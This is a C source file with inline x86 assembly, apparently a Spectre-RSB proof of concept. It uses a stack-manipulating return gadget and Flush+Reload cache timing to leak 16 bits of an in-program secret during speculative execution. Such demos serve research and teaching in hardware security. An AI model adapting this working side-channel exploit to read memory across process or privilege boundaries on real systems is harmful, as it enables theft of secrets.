#include <stdio.h> //printf

char secret_values[16] = {'1','0','0','0','0','0','1','1','0','1','1','1','0','1','0','1'};
char public_values[16] = {'2','2','2','2','2','2','2','2','2','2','2','2','2','2','2','2'};

unsigned int HIT_THRESHOLD = 250;

char secret;
char secret_value;
char *secret_address = &secret_value;
int hit_value;

#define pipeline_flush() asm volatile("mov $0, %%eax\n\tcpuid\n\tlfence" : /*out*/ : /*in*/ : "rax","rbx","rcx","rdx","memory")
#define clflush(addr) asm volatile("clflush (%0)"::"r"(addr):"memory")

unsigned char Array_area[0x200000];
#define Array (Array_area + 0x10000)

unsigned char temp; //will be used in both speculative and main functions

unsigned long number_of_hits;
unsigned int t1, t2; //used to measure time for side channel


void gadget() {
    asm volatile(
        "push %%rbp\n\t" 
        "mov %%rbp, %%rsp\n\t" //move RBP into RSP, because theb rsp from the previous function is now rbp
        "pop %%rdi\n\t" 
        "pop %%rdi\n\t"
        "pop %%rdi\n\t"
        "pop %%rdi\n\t" // pop everything like local variables and so on
        "pop %%rbp\n\t" // restore old rbp value
        "mfence\n\t"
        "clflush (%%rsp)\n"
        "mfence\n\t"
        "retq\n\t"
        : /*out*/ 
        : /*in*/ 
        : 
        "r11",
        "rax",
        "rbx",
        "rcx",
        "rdx",
        "rdi", 
        "memory"
    );
}

void speculative(char *secret_ptr) {
    asm volatile("mfence");
    Array['0' << 12] = 1;
    Array['1' << 12] = 1;
    clflush(&Array['0' << 12]);
    clflush(&Array['1' << 12]);
    asm volatile("mfence");
    gadget(); //modify the Software stack
    secret = *secret_address; //Speculative return here
    temp = *(Array + (secret << 12));
    printf("Shouldn't be visible\n");
}

unsigned char check_chache_hit() {
    pipeline_flush();
    asm volatile(
        "lfence\n\t"
        "rdtscp\n\t"
        "mov %%eax, %%ebx\n\t"
        "mov (%%rdi), %%r11\n\t"
        "rdtscp\n\t"
        "lfence\n\t"
    ://out
        "=a"(t2),
        "=b"(t1)
    ://in
    //0x1000 * '0' = 4096 * 48 = 196608
        "D"(Array + 0x1000 * '0')
    ://clobber
        "r11",
        "rcx",
        "rdx",
        "memory"
    );
    pipeline_flush();
    unsigned int delay_0 = t2 - t1;

    pipeline_flush();
    asm volatile(
        "lfence\n\t"
        "rdtscp\n\t"
        "mov %%eax, %%ebx\n\t"
        "mov (%%rdi), %%r11\n\t"
        "rdtscp\n\t"
        "lfence\n\t"
    ://out
        "=a"(t2),
        "=b"(t1)
    ://in
    //0x1000 * '1' = 4096 * 49 = 200704
        "D"(Array + 0x1000 * '1')
    ://clobber
        "r11",
        "rcx",
        "rdx",
        "memory"
    );
    pipeline_flush();
    unsigned int delay_1 = t2 - t1;

    if (delay_0 < HIT_THRESHOLD && delay_1 > HIT_THRESHOLD) {
        pipeline_flush();
        return '0';
    }   
    if (delay_0 > HIT_THRESHOLD && delay_1 < HIT_THRESHOLD) {
        pipeline_flush();
        return '1';
    }
    return '#';

}

int main() {
    for(int i = 0; i < 16; i++) {
        asm volatile("mfence");
        secret_value = secret_values[i];
        asm volatile("mfence");
        pipeline_flush();
        speculative(secret_address);
        public_values[i] = check_chache_hit();
    }

    for(int i = 0; i < 16; i++) {
        if(public_values[i] == secret_values[i]) {
            printf("%i: Correct result\n",i);
        } else {
            printf("%i: You won't be amazed, because it wrong :(\n",i);
        }
    }

    return 0;
}